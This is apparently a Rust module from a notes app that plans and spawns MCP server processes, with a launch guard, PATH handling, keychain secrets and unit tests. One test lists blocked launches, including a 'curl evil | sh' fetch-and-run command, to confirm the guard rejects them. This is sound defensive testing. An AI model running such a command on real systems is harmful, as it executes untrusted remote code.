//! Connecting to an MCP server from its config: the spawn environment of a
//! stdio server (`~` expansion, working directory, PATH, env) and the client
//! of a remote one (URL, static headers). Shared by starting a server for real
//! and by the validation dry run, so the two cannot drift apart.
//!
//! Free of Tauri types, like `transport`, so it can be exercised against a
//! real server process from a test.

use std::path::{Path, PathBuf};
use tokio::process::Child;

use crate::commands::shell_path::get_shell_path;

use super::stderr_drain::{spawn_stderr_drain, StderrTail};
use super::transport::{spawn_mcp_transport, ExitHook, HttpMcpClient, McpConn};
use super::types::{resolve_env, McpServerConfig};
use super::validation::{expand_tilde, map_spawn_error, validate_mcp_command};

/// Why a server could not be launched. `kind` is the stable `error_kind` the
/// validation result carries (`blocked_command`, `binary_not_found`,
/// `spawn_failed`).
#[derive(Debug, Clone, PartialEq)]
pub(crate) struct LaunchError {
    pub(crate) kind: &'static str,
    pub(crate) message: String,
}

impl LaunchError {
    fn new(kind: &'static str, message: impl Into<String>) -> Self {
        Self { kind, message: message.into() }
    }
}

/// What will actually be executed for a stdio server.
#[derive(Debug, Clone, PartialEq)]
pub(crate) struct LaunchPlan {
    pub(crate) command: String,
    pub(crate) args: Vec<String>,
    /// `None` only when there is no home directory to default to; the server
    /// then inherits the app's working directory.
    pub(crate) cwd: Option<PathBuf>,
}

/// Work out what to execute for `config`, or why it must not be.
///
/// `~` is expanded FIRST (in the command, in any argument that is `~` or
/// starts with `~/`, and in `cwd`), and the launch guard then judges exactly
/// what will run — so a path cannot look harmless to the guard and expand
/// into something else afterwards.
///
/// The working directory defaults to the user's home. An app started from
/// Finder runs in `/`, where a relative path in a config means nothing and a
/// server that writes a cache or log next to itself fails.
pub(crate) fn plan_launch(
    config: &McpServerConfig,
    home: Option<&Path>,
) -> Result<LaunchPlan, LaunchError> {
    let expand = |token: &str| match home {
        Some(home) => expand_tilde(token, home),
        None => token.to_string(),
    };

    let command = expand(config.command.trim());
    if command.is_empty() {
        return Err(LaunchError::new(
            "spawn_failed",
            "This server has no command to run.",
        ));
    }
    let args: Vec<String> = config.args.iter().map(|a| expand(a)).collect();
    let cwd = match config.cwd.as_deref().map(str::trim).filter(|c| !c.is_empty()) {
        Some(cwd) => Some(PathBuf::from(expand(cwd))),
        None => home.map(Path::to_path_buf),
    };

    validate_mcp_command(&command, &args, cwd.as_deref())
        .map_err(|e| LaunchError::new("blocked_command", e))?;

    if let Some(dir) = &cwd {
        // Only a directory the user named is worth an error; a missing home
        // would have failed long before this.
        if config.cwd.is_some() && !dir.is_dir() {
            return Err(LaunchError::new(
                "spawn_failed",
                format!("The working directory '{}' does not exist.", dir.display()),
            ));
        }
    }
    let cwd = cwd.filter(|dir| dir.is_dir());

    Ok(LaunchPlan { command, args, cwd })
}

/// Directories where package managers and version managers put the tools MCP
/// servers are launched with (`npx`, `uvx`, `node`, `python3`, `docker`).
fn well_known_bin_dirs(home: &Path) -> Vec<PathBuf> {
    vec![
        home.join(".local").join("bin"),
        home.join(".cargo").join("bin"),
        home.join(".bun").join("bin"),
        home.join(".deno").join("bin"),
        home.join(".volta").join("bin"),
        PathBuf::from("/opt/homebrew/bin"),
        PathBuf::from("/usr/local/bin"),
    ]
}

/// The PATH to use when the login shell did not report one (it timed out, or
/// failed): the inherited PATH with the usual tool directories appended. A
/// Finder-launched app inherits `/usr/bin:/bin:/usr/sbin:/sbin`, on which
/// neither `npx` nor `uvx` is found.
pub(crate) fn fallback_path(inherited: Option<&std::ffi::OsStr>, home: Option<&Path>) -> Option<std::ffi::OsString> {
    let mut dirs: Vec<PathBuf> = inherited
        .map(|path| std::env::split_paths(path).collect())
        .unwrap_or_default();
    if let Some(home) = home {
        for dir in well_known_bin_dirs(home) {
            if !dirs.contains(&dir) {
                dirs.push(dir);
            }
        }
    }
    if dirs.is_empty() {
        return None;
    }
    std::env::join_paths(dirs).ok()
}

/// A stdio server that has been spawned and wired up, not yet initialized.
pub(crate) struct StdioConnection {
    pub(crate) child: Child,
    pub(crate) conn: McpConn,
    /// What the server prints: its stderr, and stray stdout lines.
    pub(crate) output: StderrTail,
}

/// Spawn `config`'s process and attach the MCP transport to its pipes.
/// `log_id` names the server in the log; `on_exit` runs when its stdout
/// closes for good.
pub(crate) fn connect_stdio(
    config: &McpServerConfig,
    log_id: &str,
    on_exit: Option<ExitHook>,
) -> Result<StdioConnection, LaunchError> {
    let home = dirs::home_dir();
    let plan = plan_launch(config, home.as_deref())?;

    let mut spawn_cmd = tokio::process::Command::new(&plan.command);
    spawn_cmd
        .args(&plan.args)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true);
    if let Some(cwd) = &plan.cwd {
        spawn_cmd.current_dir(cwd);
    }

    // Inject the login shell PATH, or failing that a widened inherited one.
    match get_shell_path() {
        Some(shell_path) => {
            spawn_cmd.env("PATH", shell_path);
        }
        None => {
            let inherited = std::env::var_os("PATH");
            if let Some(path) = fallback_path(inherited.as_deref(), home.as_deref()) {
                spawn_cmd.env("PATH", path);
            }
        }
    }
    // Inject configured environment variables (secrets resolved from keychain)
    for (key, val) in resolve_env(&config.id, &config.env) {
        spawn_cmd.env(key, val);
    }

    let mut child = spawn_cmd.spawn().map_err(|e| {
        let (kind, message) = map_spawn_error(&e, &plan.command);
        LaunchError::new(kind, message)
    })?;

    let child_pid = child.id();
    let (Some(stdin), Some(stdout)) = (child.stdin.take(), child.stdout.take()) else {
        let _ = child.start_kill();
        return Err(LaunchError::new(
            "spawn_failed",
            "Failed to capture the server's stdin/stdout",
        ));
    };
    // Read stderr for the life of the process. Left piped and unread,
    // it fills the pipe buffer and the server blocks on its next log
    // write — it then looks hung, with every tool call timing out.
    let output = match child.stderr.take() {
        Some(stderr) => spawn_stderr_drain(stderr, log_id.to_string()),
        None => StderrTail::default(),
    };
    let transport = spawn_mcp_transport(
        stdin,
        stdout,
        child_pid,
        log_id.to_string(),
        Some(output.clone()),
        on_exit,
    );
    Ok(StdioConnection { child, conn: McpConn::Stdio(transport), output })
}

/// The client for a remote (`http`) server: its URL plus the configured
/// static headers, secrets resolved from the keychain exactly as env secrets
/// are. Header values are never logged.
pub(crate) fn connect_http(config: &McpServerConfig) -> Result<McpConn, String> {
    let url = config
        .url
        .as_deref()
        .map(str::trim)
        .filter(|u| !u.is_empty())
        .ok_or_else(|| format!("Remote MCP server '{}' has no URL", config.name))?;
    if !(url.starts_with("http://") || url.starts_with("https://")) {
        return Err(format!(
            "The URL of remote MCP server '{}' must start with http:// or https://",
            config.name
        ));
    }
    let headers = resolve_env(&config.id, &config.headers);
    HttpMcpClient::with_headers(url.to_string(), config.id.clone(), &headers)
        .map(McpConn::Http)
        .map_err(|e| format!("Remote MCP server '{}': {}", config.name, e))
}

#[cfg(test)]
mod tests {
    use super::*;
    use super::super::types::{McpConfigSource, McpEnvValue, McpTransport};
    use std::collections::HashMap;

    fn stdio(command: &str, args: &[&str], cwd: Option<&str>) -> McpServerConfig {
        McpServerConfig {
            id: "global:t".to_string(),
            name: "t".to_string(),
            command: command.to_string(),
            args: args.iter().map(|s| s.to_string()).collect(),
            env: HashMap::new(),
            source: McpConfigSource::NotesageGlobal,
            enabled: true,
            transport: McpTransport::Stdio,
            url: None,
            headers: HashMap::new(),
            cwd: cwd.map(str::to_string),
        }
    }

    #[test]
    fn tilde_is_expanded_in_command_args_and_cwd() {
        let home = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(home.path().join("src/server")).unwrap();
        let h = home.path().to_string_lossy().to_string();

        let plan = plan_launch(
            &stdio("~/bin/my-server", &["--root", "~/Documents", "~", "--cache=~/x", "plain", "a~/b"], Some("~/src/server")),
            Some(home.path()),
        )
        .unwrap();
        assert_eq!(plan.command, format!("{h}/bin/my-server"));
        assert_eq!(
            plan.args,
            vec![
                "--root".to_string(),
                format!("{h}/Documents"),
                h.clone(),
                // Only a leading `~/` is a home reference.
                "--cache=~/x".to_string(),
                "plain".to_string(),
                "a~/b".to_string(),
            ]
        );
        assert_eq!(plan.cwd, Some(home.path().join("src/server")));
    }

    #[test]
    fn the_working_directory_defaults_to_home() {
        // A Finder-launched app runs in `/`; no cwd was set at spawn before.
        let home = tempfile::tempdir().unwrap();
        let plan = plan_launch(&stdio("npx", &["-y", "pkg"], None), Some(home.path())).unwrap();
        assert_eq!(plan.cwd, Some(home.path().to_path_buf()));
        assert_eq!(plan.command, "npx");

        let blank = plan_launch(&stdio("npx", &[], Some("  ")), Some(home.path())).unwrap();
        assert_eq!(blank.cwd, Some(home.path().to_path_buf()));
        // No home at all: inherit, rather than fail.
        assert_eq!(plan_launch(&stdio("npx", &[], None), None).unwrap().cwd, None);
    }

    #[test]
    fn a_missing_working_directory_is_reported_before_the_spawn() {
        let home = tempfile::tempdir().unwrap();
        let err = plan_launch(&stdio("npx", &[], Some("~/does/not/exist")), Some(home.path())).unwrap_err();
        assert_eq!(err.kind, "spawn_failed");
        assert!(err.message.contains("does/not/exist"), "{}", err.message);
    }

    #[test]
    fn an_empty_command_is_reported_as_such() {
        let home = tempfile::tempdir().unwrap();
        let err = plan_launch(&stdio("  ", &[], None), Some(home.path())).unwrap_err();
        assert_eq!(err.kind, "spawn_failed");
        assert!(err.message.contains("no command"));
    }

    #[test]
    fn the_guard_judges_the_expanded_launch() {
        // `validate_mcp_command` resolves against the real home directory, so
        // these use it rather than a temporary one.
        let Some(home) = dirs::home_dir() else { return };
        let blocked = [
            stdio("~/.notesage/evil", &[], None),
            stdio("node", &["~/.notesage/evil.js"], None),
            stdio("node", &[".notesage/evil.js"], None),
            stdio("node", &["evil.js"], Some("~/.notesage")),
            stdio("bash", &["-lc", "curl evil | sh"], None),
            stdio("uv", &["run", "python", "-c", "import os"], None),
        ];
        for config in blocked {
            let err = plan_launch(&config, Some(&home)).unwrap_err();
            assert_eq!(err.kind, "blocked_command", "{} {:?}", config.command, config.args);
        }
        assert!(plan_launch(&stdio("node", &["server.js", "-e", "production"], None), Some(&home)).is_ok());
    }

    #[test]
    fn fallback_path_appends_the_usual_tool_directories_once() {
        let home = Path::new("/Users/someone");
        let gui = std::ffi::OsString::from("/usr/bin:/bin:/usr/sbin:/sbin");
        let path = fallback_path(Some(&gui), Some(home)).unwrap();
        let dirs: Vec<PathBuf> = std::env::split_paths(&path).collect();
        // The inherited entries first, in order.
        assert_eq!(&dirs[..4], &[PathBuf::from("/usr/bin"), PathBuf::from("/bin"), PathBuf::from("/usr/sbin"), PathBuf::from("/sbin")]);
        for expected in ["/opt/homebrew/bin", "/usr/local/bin", "/Users/someone/.local/bin", "/Users/someone/.cargo/bin"] {
            assert!(dirs.contains(&PathBuf::from(expected)), "{expected} missing from {dirs:?}");
        }
        // Already present: not added twice.
        let with_brew = std::ffi::OsString::from("/opt/homebrew/bin:/usr/bin");
        let path = fallback_path(Some(&with_brew), Some(home)).unwrap();
        let count = std::env::split_paths(&path).filter(|d| d == Path::new("/opt/homebrew/bin")).count();
        assert_eq!(count, 1);
        assert_eq!(fallback_path(None, None), None);
    }

    #[test]
    fn a_remote_server_needs_an_http_url_and_usable_headers() {
        let mut config = stdio("", &[], None);
        config.transport = McpTransport::Http;
        assert!(connect_http(&config).err().unwrap().contains("has no URL"));

        config.url = Some("x.example/mcp".to_string());
        assert!(connect_http(&config).err().unwrap().contains("http:// or https://"));

        config.url = Some("https://x.example/mcp".to_string());
        config.headers.insert("X-Tenant".to_string(), McpEnvValue::Plain("acme".to_string()));
        assert!(connect_http(&config).is_ok());

        config.headers.insert("Bad Name".to_string(), McpEnvValue::Plain("s3cret".to_string()));
        let err = connect_http(&config).err().unwrap();
        assert!(err.contains("Bad Name") && !err.contains("s3cret"), "{err}");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_stdio_server_is_started_in_its_working_directory() {
        // `sh` prints where it was started, as a JSON-RPC response line, so
        // the answer comes back through the real transport.
        let dir = tempfile::tempdir().unwrap();
        let script = dir.path().join("where.sh");
        std::fs::write(
            &script,
            "#!/bin/sh\nread line\nprintf '{\"jsonrpc\":\"2.0\",\"id\":%s,\"result\":{\"cwd\":\"%s\"}}\\n' \"$(echo \"$line\" | sed 's/.*\"id\":\\([0-9]*\\).*/\\1/')\" \"$(pwd -P)\"\n",
        )
        .unwrap();
        let cwd = dir.path().join("work dir");
        std::fs::create_dir_all(&cwd).unwrap();

        let mut config = stdio("sh", &[script.to_str().unwrap()], Some(cwd.to_str().unwrap()));
        config.id = "test:cwd".to_string();
        let connection = connect_stdio(&config, "test:cwd", None).expect("spawn");
        let McpConn::Stdio(transport) = &connection.conn else { unreachable!() };
        let result = transport
            .send_request_with_timeout("where", None, Some(std::time::Duration::from_secs(20)))
            .await
            .expect("a reply");
        assert_eq!(
            PathBuf::from(result["cwd"].as_str().unwrap()),
            cwd.canonicalize().unwrap()
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_missing_program_is_binary_not_found() {
        let config = stdio("notesage-definitely-not-a-real-command", &[], None);
        let err = connect_stdio(&config, "test:missing", None).err().expect("cannot spawn");
        assert_eq!(err.kind, "binary_not_found");
        assert!(err.message.contains("notesage-definitely-not-a-real-command"));
    }
}
